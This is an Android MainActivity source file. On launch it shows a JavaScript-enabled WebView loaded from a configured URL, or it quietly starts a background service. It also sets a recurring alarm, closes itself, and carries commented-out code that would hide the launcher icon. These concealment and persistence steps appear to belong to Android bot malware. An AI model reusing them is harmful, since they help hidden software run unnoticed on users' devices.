package myapp.stuff.example.Activity;


import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;

import myapp.stuff.example.StartWhileGlobal;
import myapp.stuff.example.UtilsClass;
import myapp.stuff.example.Constants;

public class MainActivity extends Activity {
    UtilsClass SF = new UtilsClass();
    Constants const_ = new Constants();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if((const_.checkActivityImage)&&(android.os.Build.VERSION.SDK_INT >= 19)){
            WebView view = new WebView(this);
            view.getSettings().setJavaScriptEnabled(true);
            view.loadUrl(const_.urlImage);
            setContentView(view);
        }else {
            startService(new Intent(this, StartWhileGlobal.class));
        }
//        ComponentName CTD = new ComponentName(this, MainActivity.class);
//        getPackageManager().setComponentEnabledSetting(CTD, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        try{
            UtilsClass.startCustomTimer(this, "startAlarm", Integer.parseInt(SF.SetRead(this,"Interval")));
        }catch (Exception ex){
            UtilsClass.startCustomTimer(this, "startAlarm", 10000);
        }
        if(!const_.checkActivityImage)finish();
    }
}